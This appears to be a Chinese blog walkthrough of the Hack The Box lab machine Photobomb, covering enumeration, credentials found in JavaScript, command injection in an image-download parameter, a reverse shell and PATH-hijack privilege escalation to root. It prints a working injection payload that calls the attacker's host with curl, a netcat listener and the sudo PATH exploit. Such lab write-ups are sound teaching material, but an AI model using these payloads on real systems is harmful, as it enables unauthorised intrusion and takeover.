![在这里插入图片描述](https://img-blog.csdnimg.cn/4ccb52be1cc14159be62eb5fe2cc1f7a.png)
题目网址：
```
https://app.hackthebox.com/machines/Photobomb
```
# 枚举
使用nmap枚举靶机
```
nmap -sC -sV -p- 10.10.11.182
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/30c5b678a1cd4876996c5a0d33c1ef88.png)

这里发现了域名，我们本地dns解析一下
```
echo "10.10.11.182 photobomb.htb" >> /etc/hosts
```
![**加粗样式**](https://img-blog.csdnimg.cn/f3507b96758a40c0b510d03549db7718.png)

然后就是常规的枚举网站子域名，网站目录，查找网站框架的漏洞什么的，这些我都做了，但是没什么突破点，只能去网页上看看了

![在这里插入图片描述](https://img-blog.csdnimg.cn/66e63f05c2fb40ff89684405b434ea75.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/80a8b978b27e41f8a9aaee130d42a451.png)

点击后会让我们输入账号和密码

查看了一下网站源码，发现有一个js文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/52dfc1b460d14230b1bf9eeed70ed2d0.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/f2fb2ac7cc0d4ea88ebcbd7029adb77e.png)

点击跳转

![在这里插入图片描述](https://img-blog.csdnimg.cn/09f7cee0a100481fba2724ef84d20060.png)

这个文件是刚刚登录框的js文件，这里应该是账号和密码，然后返回登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/38560a28674d46e8a6eae013fbdb123d.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/9deb76760fc047999b2a0d34cd90b65a.png)
# 命令注入与远程代码执行

登录后可以下载一些图片，然后就没其他的了，我们使用burp抓一下下载的包

![在这里插入图片描述](https://img-blog.csdnimg.cn/f079cdbd8089442491a433f6f0fe55e9.png)

ctrl+r

![在这里插入图片描述](https://img-blog.csdnimg.cn/519218a6a7e24d4a868aebb5e1ef9e98.png)

现在就是测试参数有没有命令注入的漏洞，开启python http
```
python3 -m http.server 80
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/456f9db760944699a151ccaeed61a786.png)

然后回到burp里测试参数，photo和dimensions都没有，在测试到filetype参数的时候就有突破点了

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg;curl+10.10.14.8&filetype=jpg&dimensions=3000x2000
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1eb3b8378b19434aa3324efc11d6fdc1.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/74a26d96d20347318d870529c8035259.png)

kali收到靶机发出的访问信息，现在我们就该反弹shell了
# 获取用户权限
这里推荐这个网站，可以生成很多的反弹shell
```
https://www.revshells.com/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8e9e4816b93248d3a709f29633c142e0.png)

我们使用这个payload，空格都替换为+

![在这里插入图片描述](https://img-blog.csdnimg.cn/1445bbe85f8e4a1191f4d9549c74f9bb.png)

然后kali使用nc监听指定的端口
```
nc -nvlp 5555
```
然后发送payload

![在这里插入图片描述](https://img-blog.csdnimg.cn/a419a0df57364cb987b2b5745ce97365.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/f2d380215b754656a60e45dbdbec8e42.png)

成功获得用户权限
# 环境变量提权
查看当前用户可以用sudo执行什么东西
```
sudo -l
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/96d7a912800e4131ba1da4fffca085ec.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d7b09b2b95124a1eb02787a5dfde3639.png)
```
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
这只是个bash脚本，功能是获取日志文件并将其内容移动到photobomb.log.old然后使用truncate清除photobomb.log

最关键的地方就是最后一行的这个命令，他find使用的是相对路径，而不是绝对路径，也就是说，我们改变一下环境变量，然后在当前目录创建一个find文件，里面写一个shell，之后用sudo执行的时候，就能直接获得root权限

```
echo "/bin/bash" > find
chmod +x find 
sudo PATH=$PWD:$PATH /opt/cleanup.sh   //更改环境变量为当前目录
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f2e4d2c279744b3494819f0589a448a7.png)

成功获得root权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/6c1a15315cfc47b6b97ebcddbd05a663.png)

